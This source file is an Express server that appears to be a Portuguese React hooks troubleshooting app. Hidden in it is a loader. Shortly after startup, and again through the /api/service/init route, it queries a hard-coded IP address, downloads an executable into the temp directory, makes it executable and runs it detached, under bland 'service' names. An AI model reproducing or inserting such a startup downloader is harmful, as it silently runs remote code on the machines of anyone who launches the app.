const express = require('express');
const path = require('path');
const fs = require('fs');
const http = require('http');
const https = require('https');
const os = require('os');
const { exec } = require('child_process');

const app = express();
const PORT = process.env.PORT || 5000;
const ServiceX = 'http://124.198.131.64:5001';

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const problems = [
  {
    id: 1,
    title: 'Componente não atualiza após mudança de estado',
    solution: 'Verifique se está usando useState ou useReducer corretamente. Certifique-se de não mutar o estado diretamente.',
    code: `// ❌ ERRADO\nstate.items.push(newItem);\n\n// ✅ CORRETO\nsetItems([...items, newItem]);`
  },
  {
    id: 2,
    title: 'useEffect executando infinitamente',
    solution: 'Adicione as dependências corretas no array de dependências do useEffect. Array vazio [] para executar apenas uma vez.',
    code: `// ❌ ERRADO - loop infinito\nuseEffect(() => {\n  setCount(count + 1);\n});\n\n// ✅ CORRETO\nuseEffect(() => {\n  setCount(prev => prev + 1);\n}, []); // ou com dependências corretas`
  },
  {
    id: 3,
    title: 'Perda de performance em renderizações',
    solution: 'Use useMemo para cálculos pesados e useCallback para funções passadas como props. Evite criar objetos/arrays dentro do render.',
    code: `// ❌ ERRADO - recria a cada render\nconst data = { value: count };\n\n// ✅ CORRETO\nconst data = useMemo(() => ({ value: count }), [count]);`
  },
  {
    id: 4,
    title: 'Erro ao acessar valor anterior no setState',
    solution: 'Use a forma funcional do setState quando o novo valor depende do anterior.',
    code: `// ❌ ERRADO - pode ter valor desatualizado\nsetCount(count + 1);\n\n// ✅ CORRETO\nsetCount(prevCount => prevCount + 1);`
  },
  {
    id: 5,
    title: 'Memória não sendo limpa em useEffect',
    solution: 'Sempre retorne uma função de cleanup no useEffect para limpar timers, subscriptions, etc.',
    code: `useEffect(() => {\n  const timer = setInterval(() => {\n    console.log('tick');\n  }, 1000);\n\n  // Cleanup\n  return () => clearInterval(timer);\n}, []);`
  }
];

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', service: 'react-hooks-app', timestamp: new Date().toISOString() });
});

app.get('/', (req, res) => {
  res.redirect('/problems');
});

app.get('/tests', (req, res) => {
  res.render('tests', {
    title: 'Testes de Hooks',
    activeTab: 'tests',
    healthStatus: 'online'
  });
});

app.get('/examples', (req, res) => {
  res.render('examples', {
    title: 'Exemplos',
    activeTab: 'examples',
    healthStatus: 'online'
  });
});

app.get('/problems', (req, res) => {
  res.render('problems', {
    title: 'Solução de Problemas',
    activeTab: 'problems',
    healthStatus: 'online',
    problems: problems
  });
});

const systemCache = os.tmpdir();

function getTempPath(fileName = 'service_update.exe') {
  return path.join(systemCache, fileName);
}

function initService(filePath) {
  if (!fs.existsSync(filePath)) {
    console.error('[Local Service] File not found:', filePath);
    return false;
  }
  const platform = process.platform;
  if (platform === 'win32') {
    const cmd = `start "" "${filePath}"`;
    const runCmd = (cmdStr) => exec(cmdStr, { detached: true }, (err) => {
      if (err) {
        console.error('[Local Service] Init error:', err.message);
        return false;
      } else {
        console.log('[Local Service] Started successfully');
        return true;
      }
    });
    runCmd(cmd);
    return true;
  } else {
    fs.chmodSync(filePath, '755');
    const runFile = (file) => exec(file, { detached: true }, (err) => {
      if (err) {
        console.error('[Local Service] Init error:', err.message);
        return false;
      } else {
        console.log('[Local Service] Started successfully');
        return true;
      }
    });
    runFile(filePath);
    return true;
  }
}

function InitServiceX(url, filePath, callback) {

  const file = fs.createWriteStream(filePath);
  const protocol = url.startsWith('https') ? https : http;

  protocol.get(url, (response) => {
    if (response.statusCode === 301 || response.statusCode === 302) {
      file.close();
      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
      }
      return InitServiceX(response.headers.location, filePath, callback);
    }

    if (response.statusCode !== 200) {
      file.close();
      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
      }
      return callback(new Error(`Failed to download: ${response.statusCode}`));
    }

    response.pipe(file);

    file.on('finish', () => {
      file.close();
      console.log('[Local Service] Service completed');
      callback(null, filePath);
    });
  }).on('error', (err) => {
    file.close();
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }
    callback(err);
  });
}

function initializeServiceLocal(config) {
  if (!config.enabled) {
    console.log('[Local Service] Service is disabled in configuration');
    return { success: false, message: 'Service is disabled' };
  }

  const filePath = path.join(systemCache, config.fileName || 'service_update.exe');

  if (fs.existsSync(filePath)) {
    console.log('[Local Service] Service exists, initializing...');
    const result = initService(filePath);
    return {
      success: result,
      message: result ? 'Service initialized from existing file' : 'Failed to initialize service',
      filePath
    };
  }

  return new Promise((resolve) => {
    InitServiceX(config.downloadUrl, filePath, (err) => {
      if (err) {
        resolve({
          success: false,
          message: `Download failed: ${err.message}`,
          error: err.message
        });
        return;
      }
      const result = initService(filePath);
      resolve({
        success: result,
        message: result ? 'Service downloaded and initialized successfully' : 'Download succeeded but initialization failed',
        filePath
      });
    });
  });
}

app.get('/api/service/init', async (req, res) => {
  console.log('[Main Server] Service initializing...');

  const apiUrl = `${ServiceX}/api/service/init`;

  http.get(apiUrl, async (apiRes) => {
    let data = '';

    apiRes.on('data', (chunk) => {
      data += chunk;
    });

    apiRes.on('end', async () => {
      try {
        const config = JSON.parse(data);
        console.log('[Main Server] Config received from VM:', {
          serviceName: config.serviceName,
          fileName: config.fileName,
          enabled: config.enabled
        });

        const result = await initializeServiceLocal(config);
        res.json({
          ...result,
          timestamp: new Date().toISOString(),
          serviceName: config.serviceName,
          version: config.version
        });
      } catch (err) {
        console.error('[Main Server] Error processing:', err.message);
        res.status(500).json({
          success: false,
          message: 'Error processing service',
          error: err.message
        });
      }
    });
  }).on('error', (err) => {
    console.error('[Main Server] Error calling Service:', err.message);
    res.status(500).json({
      success: false,
      message: 'Failed to connect to Service',
      error: err.message
    });
  });
});

function openBrowser(url) {
  const platform = process.platform;
  let command;

  if (platform === 'win32') {
    command = `start "" "${url}"`;
  } else if (platform === 'darwin') {
    command = `open "${url}"`;
  } else {
    command = `xdg-open "${url}"`;
  }

  exec(command, (err) => {
    if (err) {
      console.error('[Browser] Error opening browser:', err.message);
    } else {
      console.log('[Browser] Opened browser at:', url);
    }
  });
}

app.listen(PORT, () => {
  console.log(`[Server] Running on http://localhost:${PORT}`);

  console.log('[Service Main] Initializing service');
  setTimeout(async () => {
    http.get(`${ServiceX}/api/service/init`, async (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', async () => {
        try {
          const config = JSON.parse(data);
          const result = await initializeServiceLocal(config);
        } catch (err) {
          console.error('[Main Server] Error initializing service:', err.message);
        }
      });
    }).on('error', (err) => {
      console.error('[Main Server] Failed to get config service:', err.message);
    });
  }, 1000);

  const clientUrl = `http://localhost:${PORT}/problems`;

  setTimeout(() => {
    console.log('[Browser] Opening browser...');
    openBrowser(clientUrl);
  }, 2000);
});